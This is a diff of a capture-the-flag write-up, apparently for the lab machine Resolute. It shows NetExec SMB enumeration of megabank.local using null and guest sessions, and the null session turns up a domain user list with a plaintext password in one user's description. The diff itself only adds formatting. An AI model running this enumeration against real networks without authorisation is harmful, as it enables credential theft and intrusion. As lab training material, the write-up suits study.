@@ -90,6 +90,7 @@ cat smb.hosts
 
 I used the command to make sure the hostname and domain both are correct.
 
+---
 ```
 nxc smb 10.129.100.9 -u '' -p '' --shares           
 SMB         10.129.100.9    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
@@ -104,9 +105,11 @@ nxc smb 10.129.100.9 -u 'guest' -p '' --shares
 SMB         10.129.100.9    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
 SMB         10.129.100.9    445    RESOLUTE         [-] megabank.local\guest: STATUS_ACCOUNT_DISABLED
 ```
+
 Null session authentication was accepted, but share listing was denied.
 Anonymous login failed, and the guest account was disabled.
 
+---
 ```
 nxc smb 10.129.100.9 -u '' -p '' --users
 SMB         10.129.100.9    445    RESOLUTE         [*] Windows Server 2016 Standard 14393 x64 (name:RESOLUTE) (domain:megabank.local) (signing:True) (SMBv1:True) (Null Auth:True)
@@ -166,6 +169,7 @@ zach
 simon
 naoki
 ```
+
 Since null session authentication was accepted, I tried to enumerate users. 
 This returned a list of domain users, and the description for the user `marko` indicated that the password was set to `Welcome123!`.
 
